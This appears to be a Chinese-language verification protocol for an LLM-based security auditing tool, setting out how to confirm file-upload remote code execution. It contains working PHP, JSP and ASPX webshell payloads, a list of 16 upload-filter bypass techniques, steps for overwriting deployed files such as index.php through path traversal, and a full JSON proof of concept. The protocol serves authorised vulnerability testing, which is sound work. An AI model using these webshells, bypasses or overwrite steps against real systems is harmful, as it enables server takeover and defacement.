# 文件上传漏洞实质性验证协议

## 核心原则

**上传成功 ≠ 漏洞成功。** 真正的"任意文件上传 RCE"必须满足三个独立证据点：
1. 上传请求被服务器接受（写入文件系统）
2. 上传后的文件可被 HTTP 访问（不在禁止访问目录）
3. 访问后服务器**解释执行**了上传内容（响应里出现命令输出或唯一标记）

只要第 3 步缺失，就算前两步全成功，也只能算"任意文件上传"（中危）而不是"上传 RCE"（严重）。

> ⚠️ 这一区分很重要——很多 CMS 允许上传任意文件做存储，但上传目录配了 `php_flag engine off` 或 nginx 的 `location ~ \.(php|jsp)$ { deny all; }`，这种情况只能算敏感配置缺失，绝不能写成"RCE"。

---

## 强制 3 步 PoC 模板

所有 `vuln_type` 涉及"文件上传 + 代码执行"的 finding，PoC 必须至少含 3 个 step：

| step | 目的 | request | 必填响应证据 |
|------|------|---------|--------------|
| 1 | 上传 payload | POST multipart 含唯一标记 + 命令执行片段 | 2xx/3xx + 响应中含路径（用 `extract` 抽取） |
| 2 | 直接 HTTP 访问上传后的 URL | GET `${steps.0.upload_path}` | body 中命中 `upload-marker` 或 `cmd-exec` 签名 |
| 3 (可选) | 进一步证明（如带 OS 命令的 GET 参数） | GET `${steps.0.upload_path}?cmd=id` | body 命中 `cmd-exec` 签名 |

step 数 < 3 且 vuln_type ∈ {file-upload-rce, arbitrary-file-upload, web-shell-upload} → consistency_checks **BLOCKING**。

---

## payload 模板（按目标语言）

LLM 必须根据后端检测到的语言生成 payload，并保证 payload 含**唯一标记串**（用于在响应中区分"原文回显"和"真正执行"）。

### PHP

```php
<?php
echo 'VIBECSA-' . bin2hex(random_bytes(6)) . "\n";
system('id');
?>
```

`x_signature_type`: `["upload-marker", "cmd-exec"]`

### JSP

```jsp
<%@ page import="java.util.*,java.io.*" %>
<%= "VIBECSA-" + java.util.UUID.randomUUID() %>
<%
Process p = Runtime.getRuntime().exec("id");
BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line; while ((line = br.readLine()) != null) out.println(line);
%>
```

### ASPX (C#)

```aspx
<%@ Page Language="C#" %>
<%
Response.Write("VIBECSA-" + Guid.NewGuid() + "\n");
var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c whoami");
psi.RedirectStandardOutput = true; psi.UseShellExecute = false;
var p = System.Diagnostics.Process.Start(psi);
Response.Write(p.StandardOutput.ReadToEnd());
%>
```

### Node.js (假设已有 SSI 或 require 解析能力)

绝大多数 Node 框架不会"按扩展名解析 JS 文件"，所以 Node 项目通常上传 RCE 路径是：
- 上传后被 `require()` 加载（需要找到触发点）
- 上传 `.html` 配合 SSR 注入

LLM 应按实际框架确定 payload，不可硬套 PHP/JSP 模板。

---

## Stage 2 受控绕过枚举（文件上传专项）

当 step 1 上传成功但 step 2/3 拿不到执行证据时，强制按下表逐个枚举绕过路径，每条要么命中证据，要么明确判定无效再换下一条。**禁止枚举 < 4 条就放弃**。

| # | 绕过策略 | 探索方式 |
|---|---------|---------|
| 1 | 双扩展名 | `shell.php.jpg` / `shell.jsp.png` / `shell.aspx.gif` |
| 2 | 大小写绕过 | `shell.PhP` / `shell.PHP5` / `shell.JsP` |
| 3 | 替代扩展名 | `.phtml` `.phar` `.php5` `.php7` `.pht` `.shtml` `.jspx` `.cgi` |
| 4 | MIME 伪造 | Content-Type 改为 `image/jpeg`，但内容仍是 PHP / JSP |
| 5 | 文件头伪造 | 前缀 `GIF89a` / `\xFF\xD8\xFF\xE0`（JPEG）/ `%PDF-` 后接 payload |
| 6 | `.htaccess` 覆盖 | 先上传 `.htaccess` 含 `AddType application/x-httpd-php .jpg`，再上传 `shell.jpg` |
| 7 | `web.config` 覆盖 (IIS) | 上传 `web.config` 定义 `<handlers>` 或 `<httpHandlers>` 让任意扩展走 ASP.NET |
| 8 | nginx 解析漏洞 | 访问 `upload.jpg/x.php`，依赖 `cgi.fix_pathinfo=1` 配置 |
| 9 | 路径穿越上传 | 文件名带 `../../../path/shell.php` 改写到 webroot |
| 10 | NULL 截断 | `shell.php%00.jpg`（PHP 5.3 之前 / 某些 Java 版本） |
| 11 | 长文件名截断 | 文件名末尾填 256+ 字符，触发某些框架的截断逻辑 |
| 12 | 大小写文件系统欺骗 | Windows 服务器接受 `SHELL.PHP::$DATA` |
| 13 | 多 MIME 边界绕过 | multipart body 中 boundary 操纵 |
| 14 | Content-Disposition 注入 | 文件名字段中插入 CRLF + 二次 header |
| 15 | 压缩包/ZIP slip | 上传 zip 解压时穿越目录 |
| 16 | 配置文件覆盖 | 写到 webroot 的现有 `index.php` / `home.jsp` 覆盖原文件 |

每条枚举尝试，LLM 用 curl 探索（不计入 verify_vuln.py 重试次数），命中证据则进入 Stage 2 定稿流程。

### 枚举结果分流

| 结果 | 处理 |
|------|------|
| 任一绕过命中 `upload-marker` + `cmd-exec` 签名 | `poc.result=success`, `evidence_level=L3`, `x_finding_class="runtime_verified"` |
| 全部 16 条枚举失败，源码确认仅"可上传任意类型" | 重新定性：vuln_type 改为 `arbitrary-file-upload`，severity 降一档（high→medium 或 medium→low），不再标 RCE |
| 全部失败且源码也无证据 | 撤回 finding |

---

## 已部署文件覆盖（用户在主对话明确要求）

除"上传新文件 + 访问执行"路径外，必须额外验证：**能否覆盖目标系统中已部署的脚本/配置文件**。这条路径常常因为"路径校验只查扩展名不查存在性"而被忽略，命中即为高危 RCE。

### 强制验证步骤

1. 先发请求枚举系统中已有的脚本（如 `index.php`、`admin/login.php`、`/static/app.js`、`web.config`、`.htaccess`），从响应中确认可访问
2. 构造 step `x_overwrite_target`：把上传文件名指定为上述路径（带相对路径或绝对路径）
3. 上传后访问该 URL，校验响应已变成上传的 payload（含 `x_unique_marker`）→ 证明覆盖成功

### 覆盖成功的额外签名

| 证据 | 命中标准 |
|------|---------|
| 原文件被替换 | 访问覆盖前后两次响应内容明显不同（前为原文件，后含 `x_unique_marker`） |
| 配置覆盖触发新行为 | 例如覆盖 `.htaccess` 后，原 `.jpg` 文件突然被解析为 PHP |

覆盖成功 → `x_finding_class="runtime_verified"` + severity 自动升级到 critical（如未到的话）。

> ⚠️ **覆盖系统文件需要明确测试授权**——用户提供测试环境地址即视为授权审计范围内的覆盖测试。生产环境绝对不可触发本协议。

---

## 与 vulnerability-conditions.md 联动

文件上传的 WEIGHTED 条件 "现有文件覆盖" 现升级为可单独验证项：

- 若覆盖验证成功（含 unique_marker） → WEIGHT_SCORE 直接进入"≥80%"档（即 CONFIRMED + L3）
- 若只验证了"上传 + 访问执行"但未尝试覆盖 → 仍可 CONFIRMED + L3，但 `x_overwrite_attempted=false`
- 若上传 + 访问执行 + 覆盖全部失败 → HYPOTHESIS + `x_finding_class="code_only"`

---

## 完整 PoC 示例（PHP 项目）

```json
{
  "vuln_id": "FINDING-012",
  "title": "任意文件上传 RCE —— /api/v2/avatar 未校验扩展名",
  "severity": "critical",
  "status": "CONFIRMED",
  "evidence_level": "L3",
  "vuln_type": "file-upload-rce",
  "x_signature_type": ["upload-marker", "cmd-exec"],
  "x_unique_marker": "VIBECSA-7f3a9b2c8d1e",
  "x_finding_class": "runtime_verified",
  "x_overwrite_attempted": true,
  "poc": {
    "steps": [
      {
        "step": 1,
        "request": {
          "method": "POST",
          "url": "/api/v2/avatar",
          "headers": { "Authorization": "Bearer ${creds.token}" },
          "body": {
            "_type": "multipart",
            "fields": { "user_id": "1" },
            "files": [{
              "name": "avatar",
              "filename": "shell.phtml",
              "content_type": "image/jpeg",
              "content": "GIF89a\n<?php echo 'VIBECSA-7f3a9b2c8d1e'; system('id'); ?>"
            }]
          }
        },
        "extract": { "upload_path": "$.data.url" }
      },
      {
        "step": 2,
        "request": {
          "method": "GET",
          "url": "${steps.0.upload_path}"
        }
      },
      {
        "step": 3,
        "request": {
          "method": "POST",
          "url": "/api/v2/avatar",
          "body": {
            "_type": "multipart",
            "fields": { "user_id": "1" },
            "files": [{
              "name": "avatar",
              "filename": "../../../public/index.php",
              "content_type": "image/png",
              "content": "<?php echo 'VIBECSA-OVERWRITE-7f3a'; ?>"
            }]
          }
        }
      },
      {
        "step": 4,
        "request": {
          "method": "GET",
          "url": "/index.php"
        }
      }
    ],
    "result": "success",
    "evidence": "step 2 响应命中 upload-marker (VIBECSA-7f3a9b2c8d1e) + cmd-exec (uid=33(www-data) gid=33(www-data) groups=33(www-data))；step 4 响应已被覆盖为 VIBECSA-OVERWRITE-7f3a，确认上传 + 执行 + 覆盖三路径均成立"
  }
}
```
